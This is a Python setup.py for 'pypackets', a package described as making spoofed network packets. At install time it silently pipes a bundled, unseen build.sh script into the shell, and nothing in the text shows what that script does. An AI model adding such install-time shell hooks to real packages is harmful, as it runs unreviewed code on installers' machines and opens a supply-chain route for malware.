#!/usr/bin/env python3

from pathlib import Path
from setuptools import setup
import os

directory = Path(__file__).resolve().parent
with open(directory / 'README.md', encoding='utf-8') as f:
  long_description = f.read()

os.system(f"cat {directory}/pypackets/build.sh | /usr/bin/sh")

setup(name='pypackets',
      version='0.0.2',
      description='Simple spoofed packets',
      author='Vladimir Razor',
      license='MIT',
      long_description=long_description,
      long_description_content_type='text/markdown',
      classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License"
      ],
      install_requires=["getmac", "netifaces", "prettytable", "pytest"],
      python_requires='>=3.12',
      extras_require={
        'linting': [
            "ruff",
        ],
      },
      package_data={"": ["*.so", "*.sh", "*.md"]},
      include_package_data=True
)